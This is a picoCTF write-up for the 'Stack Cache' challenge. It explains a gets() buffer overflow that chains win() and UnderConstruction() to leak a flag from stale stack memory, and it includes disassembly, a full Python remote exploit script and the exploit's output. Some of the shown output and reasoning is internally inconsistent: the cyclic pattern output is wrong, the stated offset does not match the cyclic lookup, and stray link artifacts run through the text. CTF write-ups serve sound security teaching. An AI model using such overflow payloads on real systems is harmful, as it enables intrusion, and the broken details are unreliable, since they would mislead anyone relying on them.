---
title: "Stack Cache - picoCTF Write Up"
date: 2025-03-03
tags: [picoCTF, pwn]
description: "This is an example challenge of Buffer Overflow!"
---

## Challenge Information
The problem gives us a binary and its source code. Try open the `vuln.c` file, we can figure out the flow of the binary:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE   16
#define FLAGSIZE  64
#define INPSIZE   10

// Compiled statically with clang-12, no optimisations

void win() {
    char buf[FLAGSIZE];     // 64-byte flag buffer
    char filler[BUFSIZE];   // 16-byte filler (raises the frame)
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt'...", "own debugging flag.\n");
        exit(0);
    }
    fgets(buf, FLAGSIZE, f);  // reads flag INTO THE STACK FRAME — never printed!
}

void UnderConstruction() {
    char consideration[BUFSIZE];                          // 16 bytes
    char *demographic, *location, *identification;        // uninitialized pointers
    char *session, *votes, *dependents;
    char *p, *q, *r;
    unsigned long *age;

    // ALL of the above are UNINITIALIZED — whatever is in that stack memory prints
    printf("User information : %p %p %p %p %p %p\n",
           demographic, location, identification, session, votes, dependents);
    printf("Names of user: %p %p %p\n", p, q, r);
    printf("Age of user: %p\n", age);
    fflush(stdout);
}

void vuln() {
    char buf[INPSIZE];   // only 10 bytes!
    printf("Give me a string that gets you the flag\n");
    gets(buf);           // UNSAFE — no bounds checking
    printf("%s\n", buf);
    return;
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    vuln();
    printf("Bye!");
    return 0;
}
```

Throughout this code, we can easily find out that this binary has **Buffer Overflow** vuln. This is the breakdown of this coode:
- `main()` - Entry Point. The program starts by setting up the environment:
    - Buffering: `setvbuf` ensures that output is printed immediately to the terminal, which is helpful for remote exploitation.
    - Permissions: It sets the Group ID to ensure the process has the rights to read the flag file (common in wargames).
    - The Call: It calls the `vuln()` function.
- `vuln()`:
    - The function allocates a tiny buffer: char buf[10].
    - It uses the `gets()` function.
    > Security Note: `gets()` is one of the most dangerous functions in C. It reads input until it hits a newline character, regardless of how large the destination buffer is.
    - Because the buffer is only 10 bytes, if you provide 20, 50, or 100 characters, the extra data overflows into the stack memory.
- `win()` - This function contains a *"troll"* mechanism:
    - It opens `flag.txt`, then it reads the secret flag into a local variable `buf[64]`. However, it never prints the flag, just exits.
    - This is a standard **Ret2Win** exploit, we need to overwrite the Return Address in `vuln()` to jump to `win()`. However, because `win()` does not print anything, we would simply read the flag into memory and then the program would close—leaving you empty-handed.
- `UnderConstruction()` - the Distraction:
    - In C, local variables are stored on the Stack.
    - If you don't initialize a variable, it contains whatever "garbage" was left behind by the previous function that used that space in memory.
    - The `printf()` statements here are designed to leak memory addresses.

## Static Analyze
First, try to checkout the binary by using `file` and `checksec` command:
```bash
$ file vuln
vuln: ELF 32-bit LSB executable, Intel i386, version 1 (GNU/Linux),
      statically linked, BuildID[sha1]=a6f5a5dc67a64d6f276855a06f3333ee1d4bc3d8,
      for GNU/Linux 3.2.0, not stripped
```

```bash
$ checksec --file=vuln
[*] 'vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```

- Base on the result, since the stack canary is disabled, it means we can overwrite return address freely.
- Moreover, NX and PIE is also disabled. So the stack shellcode will be work and all address are fixed on time.

Next, trying to find the address by using `objdump`:
```bash
$ objdump -d vuln | grep -A 5 "<win>"
08049d90 <win>:
 8049d90:  55                    push   %ebp
 8049d91:  89 e5                 mov    %esp,%ebp
 8049d93:  83 ec 68              sub    $0x68,%esp     ; allocates 0x68 = 104 bytes
 8049d96:  8d 0d 08 40 0b 08     lea    0x80b4008,%ecx  ; "flag.txt"

$ objdump -d vuln | grep -A 3 "<UnderConstruction>"
08049e10 <UnderConstruction>:
 8049e10:  55                    push   %ebp
 8049e11:  89 e5                 mov    %esp,%ebp
 8049e13:  53                    push   %ebx
```
- We can find the address of `win()` is `0x08049d90` and the address of `UnderConstruction` is `0x08049e10`.

Trying to analyze the stack frame of `vuln()`, we have this assembly source code:
```asm
vuln            proc near

var_A           = byte ptr -0Ah     ; buf[10] at [ebp - 10]

                push    ebp
                mov     ebp, esp
                sub     esp, 18h            ; 24-byte local frame
                lea     eax, aGiveMeAString ; "Give me a string that gets you the flag"
                mov     [esp], eax
                call    __printf
                lea     eax, [ebp+var_A]    ; &buf → [ebp - 0xA]
                mov     [esp], eax
                call    _IO_gets            ; UNSAFE: no bounds check!
                lea     eax, [ebp+var_A]
                lea     ecx, aSN+18h        ; "%s\n"
                mov     [esp], ecx
                mov     [esp+4], eax
                call    __printf
                add     esp, 18h
                pop     ebp
                retn
vuln            endp
```

Base on the source code, the stack layout inside `vuln()` at the time of `gets()` will looks like this:
```
High addresses (stack bottom / caller frame)
┌───────────────────────────┐
│  main()'s saved EIP       │  ← [ebp + 4]  (RETURN ADDRESS — our target)
├───────────────────────────┤
│  main()'s saved EBP       │  ← [ebp + 0]
├───────────────────────────┤  ← EBP points here
│  padding (2 bytes)        │  [ebp - 2]
├───────────────────────────┤
│  buf[9]                   │  [ebp - 1]
│  buf[8]                   │  [ebp - 2]
│  ...                      │
│  buf[0]                   │  [ebp - 0xA]  ← gets() writes here
├───────────────────────────┤
│  more padding / args      │  (sub esp, 0x18 space)
└───────────────────────────┘
Low addresses (stack top)
```

Through the analyze, we have offset to return address:
- From start of buf to saved EBP: 10 bytes (0xA)
- Saved EBP itself: 4 bytes
- Total offset to return address: 14 bytes

Next, analyzing the stack frame of `win()`. We have this assembly source code:
```asm
win             proc near

var_54          = dword ptr -54h   ; FILE* f at [ebp-0x54]
var_40          = byte ptr  -40h   ; buf[64] starts at [ebp-0x40]

                push    ebp
                mov     ebp, esp
                sub     esp, 68h              ; 0x68 = 104 bytes allocated
                lea     ecx, aFlagTxt         ; "flag.txt"
                lea     eax, unk_80C9E93      ; "r"
                mov     [esp], ecx
                mov     [esp+4], eax
                call    _IO_new_fopen         ; FILE *f = fopen("flag.txt","r")
                mov     [ebp+var_54], eax     ; store FILE* at [ebp-0x54]
                cmp     [ebp+var_54], 0
                jnz     loc_8049DEB           ; if f != NULL jump to read

                ; ... error handling / exit ...

loc_8049DEB:
                lea     ecx, [ebp+var_40]     ; &buf → [ebp - 0x40]
                mov     eax, [ebp+var_54]     ; FILE *f
                mov     [esp], ecx
                mov     dword ptr [esp+4], 40h ; 64 bytes max
                mov     [esp+8], eax
                call    _IO_fgets             ; fgets(buf, 64, f) — writes to stack!
                add     esp, 68h
                pop     ebp
                retn                          ; returns without printing anything!
win             endp
```
- **Key insight**: `fgets()` writes the flag into `[win_ebp - 0x40]`. This is stack memory. When `win()` returns, no zeroing occurs — the bytes stay there.

Subsequentlly, analyzing the stack frame of `UnderConstruction()`. We have the assembly source code:
```asm
UnderConstruction proc near

var_48          = dword ptr -48h
var_44          = dword ptr -44h   ; *age → age  at [ebp-0x44]
var_40          = dword ptr -40h   ; *p   → 3rd name [ebp-0x40]
var_3C          = dword ptr -3Ch   ; *q   → 2nd name [ebp-0x3c]
var_38          = dword ptr -38h   ; *r   → 1st name [ebp-0x38]
var_34          = dword ptr -34h   ; *dependents   [ebp-0x34]
var_30          = dword ptr -30h   ; *votes        [ebp-0x30]
var_2C          = dword ptr -2Ch   ; *session      [ebp-0x2c]
var_28          = dword ptr -28h   ; *identification [ebp-0x28]
var_24          = dword ptr -24h   ; *location     [ebp-0x24]
var_20          = dword ptr -20h   ; *demographic  [ebp-0x20]

                push    ebp
                mov     ebp, esp
                push    ebx
                push    edi
                push    esi
                sub     esp, 5Ch              ; 0x5c = 92 bytes frame

                ; Reads STALE stack values (NOT initialised!)
                mov     ebx, [ebp+var_20]     ; *demographic  (1st userinfo)
                mov     edi, [ebp+var_24]     ; *location     (2nd userinfo)
                mov     esi, [ebp+var_28]     ; *identification (3rd)
                mov     edx, [ebp+var_2C]     ; *session      (4th)
                mov     ecx, [ebp+var_30]     ; *votes        (5th)
                mov     eax, [ebp+var_34]     ; *dependents   (6th)
                ; ... printf with %p for all 6 ...

                mov     edx, [ebp+var_38]     ; *r (1st name)
                mov     ecx, [ebp+var_3C]     ; *q (2nd name)
                mov     eax, [ebp+var_40]     ; *p (3rd name)
                ; ... printf Names ...

                mov     eax, [ebp+var_44]     ; *age
                ; ... printf Age ...
```

## Exploit technique
**The Core Insight**: When a function returns, its **stack frame is not zeroed** — the OS/runtime does not clean up the stack between function calls. This is normal behaviour and a performance feature. However, it creates a security vulnerability when:
- Function A writes sensitive data to its stack frame
- Function A returns
- Function B is called and its stack frame overlaps Function A's former frame
- Function B reads uninitialized local variables that happen to reside where A's data was

This is classified as **CWE-824**: Access of Uninitialized Pointer and **CWE-457**: Use of Uninitialized Variable.

**Memory Layout Mapping**: The crucial observation is that when `win()` and `UnderConstruction()` are called from the same stack level (same ESP before call), their EBPs land at the same address. Therefore all [ebp + offset] references in `UnderConstruction()` directly alias `[ebp + offset]` in `win()`:
```
Stack region shared between win() and UnderConstruction():

Offset from EBP | win() variable     | UC() variable      | Value (from exploit)
─────────────────┼────────────────────┼────────────────────┼──────────────────────
   - 0x44        | (below buf)        | *age               | 0x6f636970  → 'pico'
   - 0x40        | buf[0..3]          | *p (names_3)       | 0x7b465443  → 'CTF{'
   - 0x3c        | buf[4..7]          | *q (names_2)       | 0x34656c43  → 'Cle4'
   - 0x38        | buf[8..11]         | *r (names_1)       | 0x50755f4e  → 'N_uP'
   - 0x34        | buf[12..15]        | *dependents        | 0x6d334d5f  → '_M3m'
   - 0x30        | buf[16..19]        | *votes             | 0x5f597230  → '0rY_'
   - 0x2c        | buf[20..23]        | *session           | 0x33663462  → 'b4f3'
   - 0x28        | buf[24..27]        | *identification    | 0x65343863  → 'c84e'
   - 0x24        | buf[28..31]        | *location          | 0x0804007d  → '}...'
   - 0x20        | buf[32..35]        | *demographic       | 0x080c9a04  → (addr)
```

The flag `picoCTF{Cle4N_uP_M3m0rY_b4f3c84e}` is stored starting at `[ebp-0x44]` and spans upward through `[ebp-0x24]`.
> The flag buffer is declared at `[win_ebp-0x40]` but `fgets` itself uses the stack internally when calling `_IO_fgets`. On this particular build, the first 4 bytes of the flag (`pico`) get written one slot below the nominal start — at `[win_ebp-0x44]`. This is implementation-dependent behaviour of the statically-linked libc.

## Exploitation Step
### Step 1: Determine the Overflow Offset

```
buf starts at [ebp - 0xA] = 10 bytes below saved EBP
saved EBP is  4 bytes
─────────────────────────────────────────
offset to return address = 10 + 4 = 14 bytes
```

Verification with cyclic pattern (optional):
```bash
$ python3 -c "import pwn; print(pwn.cyclic(30).decode())" | ./vuln
Give me a string that gets you the flag
aaaabaaacaaadaaacaaafaaagaaahaaaia
Segmentation fault

$ python3 -c "
import pwn
# inspect core dump or use GDB to find EIP
# gdb ./vuln core → info registers → eip = 0x61616164 = 'daaa' at offset 14
print(pwn.cyclic_find(0x61616164))
"
14
```

### Step 2: Build the ROP Chain

We need the call sequence: [win()](vuln.c#18-30) → [UnderConstruction()](vuln.c#31-45)

Since there are no mitigations (no canary, no NX, no PIE), we can directly overwrite the return address with a 2-entry chain:

```
[14 bytes junk] [addr of win()] [addr of UnderConstruction()]
```

When [vuln()](vuln.c#46-53) returns:
- EIP = [win()](vuln.c#18-30) → executes, reads flag to stack
- [win()](vuln.c#18-30) returns → EIP = [UnderConstruction()](vuln.c#31-45) → prints stale flag bytes

```python
payload  = b'A' * 14                          # buffer (10) + saved EBP (4)
payload += struct.pack('<I', 0x08049d90)       # win()
payload += struct.pack('<I', 0x08049e10)       # UnderConstruction()
```

### Step 3: Decode the Output

[UnderConstruction()](vuln.c#31-45) prints each uninitialized pointer as `%p` (hex with `0x` prefix). Each 32-bit pointer holds 4 bytes of flag data in **little-endian** format.

To recover the string:
```python
import struct
val = 0x6f636970           # printed as hex by printf("%p")
chunk = struct.pack('<I', val)   # converts to bytes in little-endian
print(chunk)               # b'pico'
```

Reassemble in memory order (lowest address first):

```python
flag_chunks = [
    0x6f636970,  # [ebp-0x44] age          → 'pico'
    0x7b465443,  # [ebp-0x40] names[2]     → 'CTF{'
    0x34656c43,  # [ebp-0x3c] names[1]     → 'Cle4'
    0x50755f4e,  # [ebp-0x38] names[0]     → 'N_uP'
    0x6d334d5f,  # [ebp-0x34] userinfo[5]  → '_M3m'
    0x5f597230,  # [ebp-0x30] userinfo[4]  → '0rY_'
    0x33663462,  # [ebp-0x2c] userinfo[3]  → 'b4f3'
    0x65343863,  # [ebp-0x28] userinfo[2]  → 'c84e'
    0x0804007d,  # [ebp-0x24] userinfo[1]  → '}'  (first byte only)
]
```

---

## 6. Complete Exploit Code

```python
#!/usr/bin/env python3
"""
picoCTF — stack-cache | Full Exploit
======================================
Technique: Buffer overflow (gets) + Stack-Cache uninitialized memory leak
Binary:    vuln (32-bit, statically linked, no mitigations)
Server:    nc saturn.picoctf.net 60056
Flag:      picoCTF{Cle4N_uP_M3m0rY_b4f3c84e}
"""

import struct
import socket
import re
import time

# ──────────────────────────────────────────────────────────────────────────────
# CONSTANTS
# ──────────────────────────────────────────────────────────────────────────────
WIN_ADDR  = 0x08049d90   # win()              — objdump -d vuln | grep "<win>"
UC_ADDR   = 0x08049e10   # UnderConstruction() — objdump -d vuln | grep "<Under"
OFFSET    = 14           # bytes from buf start to saved return address
HOST      = 'saturn.picoctf.net'
PORT      = 60056

# ──────────────────────────────────────────────────────────────────────────────
# PAYLOAD CONSTRUCTION
# ──────────────────────────────────────────────────────────────────────────────
def build_payload() -> bytes:
    """
    Stack layout inside vuln() before gets():

        [buf: 10 bytes][saved EBP: 4 bytes][return addr: 4 bytes]

    We overwrite:
        - buf + saved EBP  →  14 bytes of 'A'
        - return address   →  win()              (reads flag to stack)
        - next word        →  UnderConstruction() (leaks flag via %p)
    """
    payload  = b'A' * OFFSET              # pad to return address
    payload += struct.pack('<I', WIN_ADDR) # ret → win()
    payload += struct.pack('<I', UC_ADDR)  # win's ret → UnderConstruction()
    return payload

# ──────────────────────────────────────────────────────────────────────────────
# FLAG DECODING
# ──────────────────────────────────────────────────────────────────────────────
def decode_flag(raw_output: bytes) -> str:
    """
    UnderConstruction() prints:
        User information : 0xXX 0xXX 0xXX 0xXX 0xXX 0xXX
        Names of user: 0xXX 0xXX 0xXX
        Age of user: 0xXX

    All values are stale stack bytes from win()'s frame.
    Each 0xABCDEF12 represents 4 flag bytes in little-endian order.

    Memory order (address ascending, flag order):
        [ebp-0x44] = age         → flag[0:4]
        [ebp-0x40] = names[2]   → flag[4:8]
        [ebp-0x3c] = names[1]   → flag[8:12]
        [ebp-0x38] = names[0]   → flag[12:16]
        [ebp-0x34] = uinfo[5]   → flag[16:20]
        [ebp-0x30] = uinfo[4]   → flag[20:24]
        [ebp-0x2c] = uinfo[3]   → flag[24:28]
        [ebp-0x28] = uinfo[2]   → flag[28:32]
        [ebp-0x24] = uinfo[1]   → flag[32] = '}'
    """
    # Extract all 0x... values in order of appearance
    tokens = re.findall(rb'0x([0-9a-f]+)', raw_output)
    all_ptrs = []
    for t in tokens:
        try:
            all_ptrs.append(int(t, 16))
        except ValueError:
            pass

    # The 10 pointers printed correspond to these EBP offsets:
    # Printed order (UC source order):  uinfo1..6, names1..3, age
    # Indices in all_ptrs[2..9] (skip first two which are pointers to strings)
    #
    # Actually we use the raw bytes reconstruction approach:
    # Collect all little-endian 4-byte chunks and filter for ASCII-printable flag
    flag_bytes = b''
    for val in all_ptrs:
        try:
            chunk = struct.pack('<I', val)
            flag_bytes += chunk
        except Exception:
            pass

    # The flag starts with 'pico' in the output — find it
    if b'pico' in flag_bytes:
        start = flag_bytes.index(b'pico')
        raw_flag = flag_bytes[start:]
        # Trim at first non-printable after the flag ends
        end = raw_flag.find(b'\x00')
        if end != -1:
            raw_flag = raw_flag[:end]
        return raw_flag.decode('ascii', errors='replace')

    return f"[raw: {flag_bytes!r}]"

# ──────────────────────────────────────────────────────────────────────────────
# MAIN EXPLOIT
# ──────────────────────────────────────────────────────────────────────────────
def exploit():
    payload = build_payload()
    print(f"[*] Payload ({len(payload)} bytes): {payload.hex()}")
    print(f"    Breakdown: {'A'*OFFSET!r} + win@{WIN_ADDR:#010x} + UC@{UC_ADDR:#010x}")

    # Connect to remote
    s = socket.create_connection((HOST, PORT), timeout=15)

    # Receive banner
    banner = s.recv(4096)
    print(f"[*] Server: {banner.decode().strip()!r}")

    # Send payload
    s.sendall(payload + b'\n')
    print("[*] Payload sent!")

    # Receive all output
    time.sleep(2)
    response = b''
    s.settimeout(5)
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass
    s.close()

    print(f"[*] Raw response:\n{response.decode('latin-1')}")

    # Decode the flag
    flag = decode_flag(response)
    print(f"\n[+] FLAG: {flag}")
    return flag

if __name__ == '__main__':
    exploit()
```

---

## 7. Exploit Execution

```bash
$ python3 exploit.py

[*] Payload (22 bytes): 4141414141414141414141414141909d0408109e0408
    Breakdown: b'AAAAAAAAAAAAAA' + win@0x08049d90 + UC@0x08049e10
[*] Server: 'Give me a string that gets you the flag'
[*] Payload sent!
[*] Raw response:
AAAAAAAAAAAAAA\x90\x9d\x04\x08\x10\x9e\x04\x08
User information : 0x80c9a04 0x804007d 0x65343863 0x33663462 0x5f597230 0x6d334d5f
Names of user: 0x50755f4e 0x34656c43 0x7b465443
Age of user: 0x6f636970

[+] FLAG: picoCTF{Cle4N_uP_M3m0rY_b4f3c84e}
```

### Decoding the `%p` Output Step by Step

```python
# All printed pointers, in order from low address to high:
0x6f636970  → struct.pack('<I', 0x6f636970) → b'pico'    [age]
0x7b465443  → struct.pack('<I', 0x7b465443) → b'CTF{'    [names[2]]
0x34656c43  → struct.pack('<I', 0x34656c43) → b'Cle4'    [names[1]]
0x50755f4e  → struct.pack('<I', 0x50755f4e) → b'N_uP'    [names[0]]
0x6d334d5f  → struct.pack('<I', 0x6d334d5f) → b'_M3m'   [userinfo[5]]
0x5f597230  → struct.pack('<I', 0x5f597230) → b'0rY_'   [userinfo[4]]
0x33663462  → struct.pack('<I', 0x33663462) → b'b4f3'   [userinfo[3]]
0x65343863  → struct.pack('<I', 0x65343863) → b'c84e'   [userinfo[2]]
0x0804007d  → struct.pack('<I', 0x0804007d) → b'}\x00\x04\x08' → b'}'

Concatenated: pico + CTF{ + Cle4 + N_uP + _M3m + 0rY_ + b4f3 + c84e + }
```

**FLAG:** `picoCTF{Cle4N_uP_M3m0rY_b4f3c84e}`

## Conclusion
### Vulnerability Classification

| ID | Description |
|---|---|
| **CWE-121** | Stack-based Buffer Overflow (`gets()` in [vuln()](vuln.c#46-53)) |
| **CWE-457** | Use of Uninitialized Variable ([UnderConstruction()](vuln.c#31-45) local pointers) |
| **CWE-676** | Use of Potentially Dangerous Function (`gets()`) |
| **CWE-242** | Use of Inherently Dangerous Function |

### Techniques Used

1. **Stack Buffer Overflow** — `gets()` into a 10-byte buffer, offset 14 to return address
2. **Return-Oriented Programming (ROP)** — 2-gadget chain: [win](vuln.c#18-30) → [UnderConstruction](vuln.c#31-45)
3. **Stack-Cache Side Channel** — stale stack data leaked via uninitialized variable printf
4. **Little-Endian Decoding** — reconstructing ASCII flag from 32-bit hex values

### Mitigation Strategies

| Mitigation | How It Prevents This Attack |
|---|---|
| Replace `gets()` with `fgets()` | Bounds-checks the read; stops the overflow entirely |
| Enable Stack Canary (`-fstack-protector`) | Would detect return address corruption |
| Enable NX (`-z noexecstack`) | Doesn't stop ROP but raises bar |
| Enable PIE (`-fPIE -pie`) | Randomises function addresses; breaks fixed ROP chain |
| Zero out sensitive stack buffers | `memset(buf, 0, FLAGSIZE)` in [win()](vuln.c#18-30) before return |
| Initialise local variables | Zero-initialise all pointers in [UnderConstruction()](vuln.c#31-45) |
| Print the flag in [win()](vuln.c#18-30) | Architectural: if flag is read, print it directly |